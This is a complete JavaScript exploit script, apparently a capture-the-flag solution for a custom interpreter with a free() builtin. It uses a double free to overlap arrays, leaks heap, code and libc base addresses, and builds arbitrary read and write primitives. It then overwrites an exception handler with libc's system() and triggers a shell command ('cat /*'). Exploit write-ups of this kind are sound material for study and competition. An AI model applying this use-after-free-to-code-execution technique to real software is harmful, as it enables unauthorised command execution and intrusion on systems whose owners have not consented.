print("START")

function hex(x) {
    return "0x" + x.toString(16)
}

function hex1(r) {
    for( var n="", t=0; t<r.length; t++)
        n += ""+r.charCodeAt(t).toString(16)
    return n
}
function read_hex(str) {
    var encoded = encodeURI(str);
    var hex_val = "";
    var i = 0;
    while(i<encoded.length) {
        if(encoded[i] == "%") {
            hex_val += encoded.substring(i+1, i+3);
            i+=3;
            continue;
        } 
        else {
            hex_val += hex1(encoded[i]);
            i+=1;
            continue;
        }
    }
    return hex_val
}

function str_to_int(str) {
    var hex_val = read_hex(str);
    var res = "";
    for(var i=hex_val.length-2; i>=0; i-=2) {
        res += hex_val.substring(i, i+2);
    }
    return parseInt(res, 16);
}

function p64(int) {
    var out = ""
    var tmp = int.toString(16);
    while(tmp.length < 16) {
        tmp = "0" + tmp
    }
    for(var i=14; i>=4; i-=2) {
        val = parseInt(tmp.substring(i, i+2), 16)
        if(val >= 0x80) {
            out += "%" + val.toString(16)
        }
        else {
            x = val.toString(16)
            if(x.length == 1) {
                out += "%0" + val.toString(16)
            }
            else {
                out += "%" + val.toString(16)
            }
        }
    }
    out = decodeURI(out)
    return out
}

var a = [13.37]
var b = [13.37]

free(a)
free(b)

// c->obj = b
// c->arr = a
var c = [13.37, 13.37, 13.37, 13.37, 13.37]

free(a)

// d->obj = a
// c->arr = d->obj
var d = [13.37]

print("abcd")

// Leaks
tmp = c[3]
var heap_leak = str_to_int(tmp)
var heap = heap_leak - 0x6230
print("[*] Heap base @ "+hex(heap))

// Arb r/w (addresses without nulls)
function read(addr) {
    tmp_str = "aaaaaaaa" + p64(addr)
    c[4] = tmp_str.slice(0, 14)
    tmp = d[0]
    return str_to_int(tmp)
}

function write(addr, val) {
    tmp_str = "aaaaaaaa" + p64(addr)
    c[4] = tmp_str.slice(0, 14)
    tmp_str_2 = p64(val).slice(0, 6)
    d[0] = tmp_str_2
}

function write_str(addr, str) {
    tmp_str = "aaaaaaaa" + p64(addr)
    c[4] = tmp_str.slice(0, 14)
    tmp_str_2 = str.slice(0, 4)
    d[0] = tmp_str_2
}

var code_leak = read(heap + 0x1538)
var code = code_leak - 0x3aa5d
print("[*] Code base @ "+hex(code))

exit_got = code + 0x4ee48
var libc_leak = read(exit_got)
var libc = libc_leak - 0x455f0
print("[*] Libc base @ "+hex(libc))

var system = libc + 0x50d60
var exception = heap + 0x2b8
write(exception, system)

// var binsh1 = 0x6e69622f
var binsh1 = 0x20746163
var js_state = heap + 0x2a0
write_str(js_state, binsh1)

// var binsh2 = 0x68732f
var binsh2 = 0x2a2f
write_str(js_state + 4, binsh2)

a()